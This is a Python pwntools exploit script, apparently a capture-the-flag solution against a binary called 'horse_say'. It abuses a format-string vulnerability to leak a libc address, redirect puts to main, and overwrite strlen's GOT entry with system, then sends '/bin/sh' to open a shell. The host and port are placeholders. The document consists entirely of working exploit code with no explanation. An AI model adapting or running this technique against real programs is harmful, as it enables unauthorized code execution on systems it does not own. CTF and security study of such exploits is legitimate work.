#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF("./horse_say_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x000000000040145A
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Leak libc_base and overwrite puts -> main

fmt = b"%143$p|"
fmt += f"%{exe.sym.main - 15 & 0xffff}c%16$hn".encode()
payload = fmt.ljust(0x20, b'A')
payload += p64(exe.got.puts)

p.sendlineafter(b"something: ", payload)
p.recvuntil(b'____________________________________\n')
p.recvuntil(b"< ")
libc_leak = int(p.recvuntil(b"|", drop = True), 16)
libc.address = libc_leak - 0x2a1ca
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc.address))


# Overwrite strlen(s) -> system()
system = libc.sym.system

part1 = system & 0xff
part2 = system >> 8 & 0xffff
fmt = f"%{part1}c%16$hhn".encode()
fmt += f"%{part2 - part1}c%17$hn".encode()
payload = flat(
    fmt.ljust(0x20, B'A'),
    exe.got.strlen,
    exe.got.strlen + 1
)

p.sendlineafter(b"something: ", payload)
p.sendlineafter(b"something: ", b'/bin/sh\0')


p.interactive()